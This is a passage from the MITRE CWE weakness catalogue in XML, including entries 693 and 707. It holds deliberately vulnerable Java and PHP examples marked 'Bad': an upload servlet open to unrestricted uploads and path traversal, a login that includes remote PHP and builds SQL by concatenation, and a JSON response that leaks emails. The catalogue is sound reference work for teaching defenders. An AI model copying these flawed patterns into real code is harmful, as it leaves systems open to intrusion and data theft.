                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-219">
               <Intro_Text>This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:i>//assume the password is already encrypted, avoiding CWE-312</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>function authenticate($username,$password){<xhtml:div style="margin-left:1em;">
                        <xhtml:br/>include("http://external.example.com/dbInfo.php");<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i>//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available</xhtml:i>
                        <xhtml:br/>mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');<xhtml:br/>mysql_select_db($dbname);<xhtml:br/>$query = 'Select * from users where username='.$username.' And password='.$password;<xhtml:br/>$result = mysql_query($query);<xhtml:br/>
                        <xhtml:br/>if(mysql_numrows($result) == 1){<xhtml:div style="margin-left:1em;">mysql_close();<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">mysql_close();<xhtml:br/>return false;</xhtml:div>}</xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account.</Body_Text>
               <Body_Text>This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-220">
               <Intro_Text>This code either generates a public HTML user information page or a JSON response containing the same user information.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// API flag, output JSON if set</xhtml:i>
                     <xhtml:br/>$json = $_GET['json']<xhtml:br/>$username = $_GET['user']<xhtml:br/>if(!$json)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>$record = getUserRecord($username);<xhtml:br/>foreach($record as $fieldName =&gt; $fieldValue)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if($fieldName == "email_address") {<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// skip displaying user emails</xhtml:i>
                                       <xhtml:br/>continue;</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">writeToHtmlPage($fieldName,$fieldValue);</xhtml:div>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>else<xhtml:br/>{<xhtml:div style="margin-left:1em;">$record = getUserRecord($username);<xhtml:br/>echo json_encode($record);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-22909</Reference>
               <Description>Chain: router's firmware update procedure uses curl with "-k" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22909</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2023-5227</Reference>
               <Description>PHP-based FAQ management app does not check the MIME type for uploaded images</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2023-5227</Link>
            </Observed_Example>
			<Observed_Example>
               <Reference>CVE-2005-0406</Reference>
               <Description>Some image editors modify a JPEG image, but the original EXIF thumbnail image is left intact within the JPEG. (Also an interaction error).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0406</Link>
            </Observed_Example>
         </Observed_Examples>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
                <Submission_Date>2008-04-11</Submission_Date>
                <Submission_Version>Draft 9</Submission_Version>
                <Submission_ReleaseDate>2008-04-11</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Background_Details, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Relevant_Properties</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="693" Name="Protection Mechanism Failure" Abstraction="Pillar" Structure="Simple" Status="Draft">
         <Description>The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.</Description>
         <Extended_Description>This weakness covers three distinct situations. A "missing" protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An "insufficient" protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an "ignored" mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path.</Extended_Description>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="107"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="20"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="237"/>
            <Related_Attack_Pattern CAPEC_ID="36"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="480"/>
            <Related_Attack_Pattern CAPEC_ID="51"/>
            <Related_Attack_Pattern CAPEC_ID="57"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
            <Related_Attack_Pattern CAPEC_ID="668"/>
            <Related_Attack_Pattern CAPEC_ID="74"/>
            <Related_Attack_Pattern CAPEC_ID="87"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry is extremely high-level, a Pillar.</Rationale>
            <Comments>Consider children or descendants of this entry instead.</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Research Gap">The concept of protection mechanisms is well established, but protection mechanism failures have not been studied comprehensively. It is suspected that protection mechanisms can have significantly different types of weaknesses than the weaknesses that they are intended to prevent.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
                <Submission_Date>2008-04-11</Submission_Date>
                <Submission_Version>Draft 9</Submission_Version>
                <Submission_ReleaseDate>2008-04-11</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="707" Name="Improper Neutralization" Abstraction="Pillar" Structure="Simple" Status="Incomplete">
         <Description>The product does not ensure or incorrectly ensures that structured messages or data are well-formed and that certain security properties are met before being read from an upstream component or sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>If a message is malformed, it may cause the message to be incorrectly interpreted.</xhtml:p>
            <xhtml:p>Neutralization is an abstract term for any technique that ensures that input (and output) conforms with expectations and is "safe."  This can be done by:</xhtml:p>
	    <xhtml:ul>
	      <xhtml:li>checking that the input/output is already "safe" (e.g. validation)</xhtml:li>
	      <xhtml:li>transformation of the input/output to be "safe" using techniques such as filtering, encoding/decoding, escaping/unescaping, quoting/unquoting, or canonicalization</xhtml:li>
	      <xhtml:li>preventing the input/output from being directly provided by an attacker (e.g. "indirect selection" that maps externally-provided values to internally-controlled values)</xhtml:li>
	      <xhtml:li>preventing the input/output from being processed at all</xhtml:li>
	    </xhtml:ul>
            <xhtml:p>This weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications.</xhtml:p>
         </Extended_Description>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
            <Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="276"/>
            <Related_Attack_Pattern CAPEC_ID="277"/>
            <Related_Attack_Pattern CAPEC_ID="278"/>
            <Related_Attack_Pattern CAPEC_ID="279"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="468"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="84"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry is extremely high-level, a Pillar.</Rationale>
            <Comments>Consider children or descendants of this entry instead.</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2008-09-09</Submission_Date>
               <Submission_Version>1.0</Submission_Version>
               <Submission_ReleaseDate>2008-09-09</Submission_ReleaseDate>
		<Submission_Comment>Note: this date reflects when the entry was first published. Draft versions of this entry were provided to members of the CWE community and modified between Draft 9 and 1.0.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
